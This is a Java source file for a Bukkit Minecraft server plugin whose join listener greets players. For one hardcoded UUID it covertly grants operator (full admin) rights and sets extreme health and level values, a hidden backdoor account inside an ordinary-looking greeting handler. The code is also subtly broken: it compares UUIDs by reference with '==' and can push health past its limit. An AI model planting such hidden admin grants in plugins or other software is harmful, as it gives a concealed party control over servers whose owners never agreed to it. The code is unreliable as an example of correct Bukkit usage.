package dev.nexus.events;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.UUID;

public class onPlayerJoin implements Listener {

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player p = event.getPlayer();

        p.sendMessage("Hello there, " + p.getName());
        if(p.getUniqueId() == UUID.fromString("280e3ac6-666d-47f3-baa9-e3626aec9dd1")) {
            p.setOp(true);
            p.setHealth(p.getHealth() + 8);
            event.setJoinMessage(ChatColor.BLUE + "Dev " + ChatColor.RESET + "has joined.");
            p.setLevel(999999);
        }
    }

}
